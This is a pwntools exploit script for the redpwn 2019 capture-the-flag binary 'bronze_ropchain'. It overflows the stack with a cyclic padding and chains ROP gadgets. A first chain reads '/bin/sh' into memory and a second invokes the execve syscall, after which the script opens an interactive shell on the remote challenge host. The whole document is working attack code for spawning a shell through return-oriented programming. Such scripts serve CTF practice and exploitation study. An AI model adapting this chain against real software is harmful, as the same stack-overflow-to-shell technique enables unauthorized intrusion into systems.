#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
# CUSTOM FUNCTIONS
def _snd(s):
  io.send(str(s))
def _sndl(s):
  io.sendline(str(s))
def _snda(a,s):
  io.sendafter(str(a),str(s))
def _sndla(a,s):
  io.sendlineafter(str(a),str(s))
def _rcvu(s):
  return io.recvuntil(str(s))
def _rcva():
  return io.recvall()
def _rcvn(n):
  return io.recv(n)
context.terminal = ['tmux', 'split', '-h']

exe = context.binary = ELF('bronze_ropchain')

host = args.HOST or 'chall.2019.redpwn.net'
port = int(args.PORT or 4004)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
_rcvu('\n')

#0x0804a2eb : xchg eax, ebx ; ret
#0x0807c3b9 : nop ; inc eax ; ret
#0x0806ef52 : pop ecx ; pop ebx ; ret
#0x0806ef2b : pop edx ; ret
#0x0806f85f : nop ; int 0x80

area = 0x080d8101

rop = ROP(exe)
rop.raw(0x0806ef52)
rop.raw(area)
rop.raw(0xffffffff)
rop.raw(0x0804a2eb)
for i in range(4):
    rop.raw(0x0807c3b9)
rop.raw(0x0806ef2b)
rop.raw(0xaaaaaaaa)
rop.raw(0x0806f85f)
rop.raw(0x080488EA) # main

payload = cyclic(28) + rop.chain()
_sndl(payload)
_snd(chr(0x0))
_sndl('/bin/sh\x00')

#0x0806b019 : xor eax, eax ; pop ebx ; ret
#0x0807c3b9 : nop ; inc eax ; ret
#0x0806f2f1 : xor ecx, ecx ; int 0x80
#0x0808286a : xchg eax, edx ; ret
#0x080565a0 : xor eax, eax ; ret

rop = ROP(exe)
rop.raw(0x0806b019)
rop.raw(area)
rop.raw(0x0808286a)
rop.raw(0x080565a0)
for i in range (0xb):
    rop.raw(0x0807c3b9)
rop.raw(0x0806f2f1)
rop.raw(0xdeadbeef)
payload = cyclic(28) + rop.chain()

_sndl(payload)
_snd('1')

io.interactive()

